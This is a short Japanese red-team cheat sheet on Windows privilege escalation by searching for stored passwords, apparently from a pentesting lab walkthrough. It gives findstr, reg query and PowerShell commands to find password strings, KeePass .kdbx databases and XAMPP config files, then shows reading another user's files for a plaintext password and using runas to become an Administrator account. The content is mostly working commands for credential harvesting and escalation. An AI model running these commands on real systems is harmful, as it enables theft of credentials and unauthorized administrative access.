---
title: 機密ファイル探索
parent: Win Privilege Escalation
grand_parent: Red Team
---

# 機密ファイル探索
## Searching for Passwords

パスワードを含むファイルを検索する方法：

```bash
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### Searching in Registry for Passwords

レジストリ内でパスワードを検索するには、次のコマンドを使用します：

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### .kdbx
すべてのパスワードマネージャーデータベースを検索
```cmd
cmd> dir /s /b *.kdbx
Ps> Get-ChildItem -Recurse -Filter *.kdbx
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### xampp
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

type C:\xampp\passwords.txt

type C:\xampp\mysql\bin\my.ini
```

### Users
```powershell
# Users配下
Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

```
### User dave Home Directory
```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

cat Desktop\asdf.txt
#ここにSteveのpasswordが表示される

net user steve
# Remote Desktop Usersと表示
```

### User steve
```powershell
whoami

type C:\xampp\mysql\bin\my.ini
#daveで権限がなかったファイルにsteveでアクセスすると閲覧できる
# backupadmin Windows password for backup job
#[client]
#password       = admin123admin123!
#port=3306
#socket="C:/xampp/mysql/mysql.sock"

net user backupadmin
# Administratorsであることを確認
# Remote Desktop Users, Remote Management Users ではないことを確認

# backupadminへの切り替え
runas /user:backupadmin cmd
# admin123admin123!
```
#### !Attention!
- GUI にアクセスできないと、バインド シェルや WinRM などのよく使用されるシェルではパスワード プロンプトが入力を受け入れないため、Runas を使用できないため注意
- 対象ユーザーに「バッチジョブとしてログオン」権限がある場合は、任意のプログラムをこのユーザーとして実行するタスクをスケジュール設定することもできる
- 対象ユーザーにアクティブなセッションがある場合は、 Sysinternals のPsExec を使用できる

### User backupadmin
```shell
whoami
```
---
